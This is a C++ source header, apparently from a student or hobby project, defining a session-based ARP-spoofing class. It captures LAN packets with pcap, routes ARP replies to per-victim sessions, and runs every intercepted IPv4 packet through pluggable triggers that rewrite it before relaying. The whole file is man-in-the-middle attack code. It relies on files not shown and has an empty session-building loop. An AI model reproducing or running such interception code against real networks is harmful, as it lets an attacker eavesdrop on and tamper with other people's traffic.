#pragma once

#include <optional>
#include <netinet/in.h>
#include <iostream>
#include <pcap.h>
#include "session/ARPSessionAdaptor.cpp"
#include "BaseARPSpoofing.cpp"
#include "trigger/BaseTrigger.cpp"

class SessionARPSpoofing: public BaseARPSpoofing {
private:
    std::pair<uint8_t*, uint8_t*>* sessionList;
    int sessionCount;

    ARPSessionAdaptor* arpSessionAdaptor;

    std::vector<BaseTrigger*> triggers;
public:
    explicit SessionARPSpoofing(char *networkInterface,
                                std::pair<uint8_t *, uint8_t *> *sessionList, int sessionCount):
            BaseARPSpoofing(networkInterface), sessionList(sessionList), sessionCount(sessionCount),
            arpSessionAdaptor(new ARPSessionAdaptor(networkInterface)) {}

    void registerTrigger(BaseTrigger* packetTrigger) {
        this->triggers.push_back(packetTrigger);
    }

    void buildSession() {
        std::cout << "INFO: start scanning sender clients..." << std::endl;
        for (int i = 0; i < this->sessionCount; i++) {

        }
        std::cout << "INFO: success scanning sender clients" << std::endl;
    }

    void startARPSpoofing(int sessionTime) override {
        this->buildSession();
        this->setUpTimer(sessionTime);

        std::cout << "INFO: start arp-spoofing..." << std::endl;

        while (this->isAlive()) {

            struct pcap_pkthdr* header;
            const u_char* packet;
            pcap_next_ex(this->pcapHandle, &header, &packet);

            auto *etherHeader = (EtherHeader*) packet;
            switch (ntohs(etherHeader->type)) {
                case ETHER_TYPE_ARP: {
                    auto arpHeader = (ARPHeader*) (packet + sizeof(EtherHeader));
                    auto session = this->arpSessionAdaptor->getSession(etherHeader->d_host);
                    if (session) session.value()->receiveARPPacket(this->pcapHandle, arpHeader);
                } break;
                case ETHER_TYPE_IPV4: {
                    for (auto trigger: this->triggers) trigger->editIPV4Packet(const_cast<u_char *>(packet));
                    auto session = this->arpSessionAdaptor->getSession(etherHeader->d_host);
                    if (session) session.value()->receiveIPV4Packet(this->pcapHandle, const_cast<u_char *>(packet));
                } break;
            }
        }

        std::cout << "INFO: end arp-spoofing; timeout." << std::endl;
    }
};
